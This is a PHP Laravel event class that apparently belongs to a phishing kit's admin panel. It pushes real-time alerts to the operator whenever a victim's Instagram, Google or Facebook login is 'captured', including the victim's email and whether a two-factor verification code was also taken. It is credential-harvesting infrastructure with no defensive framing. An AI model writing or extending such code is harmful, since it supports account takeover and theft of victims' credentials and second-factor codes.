<?php

namespace App\Events;

use App\Models\LoginAttempt;
use Illuminate\Broadcasting\Channel;
use Illuminate\Broadcasting\InteractsWithSockets;
use Illuminate\Broadcasting\PresenceChannel;
use Illuminate\Broadcasting\PrivateChannel;
use Illuminate\Contracts\Broadcasting\ShouldBroadcast;
use Illuminate\Foundation\Events\Dispatchable;
use Illuminate\Queue\SerializesModels;

class NewLoginAttemptEvent implements ShouldBroadcast
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public $loginAttempt;

    public function __construct(LoginAttempt $loginAttempt)
    {
        $this->loginAttempt = $loginAttempt;
    }

    public function broadcastOn()
    {
        return new PrivateChannel('admin-notifications');
    }

    public function broadcastWith()
    {
        $platform = $this->loginAttempt->platform === 'instagram' ? 'Instagram' : ($this->loginAttempt->platform === 'gmail' ? 'Google' : 'Facebook');
        $status = $this->loginAttempt->status === 'verification' ? 'with verification code' : 'credentials';

        return [
            'id' => $this->loginAttempt->id,
            'message' => "New $platform login captured ($status)",
            'platform' => $this->loginAttempt->platform,
            'email' => $this->loginAttempt->email,
            'created_at' => $this->loginAttempt->created_at->format('Y-m-d H:i:s'),
        ];
    }
}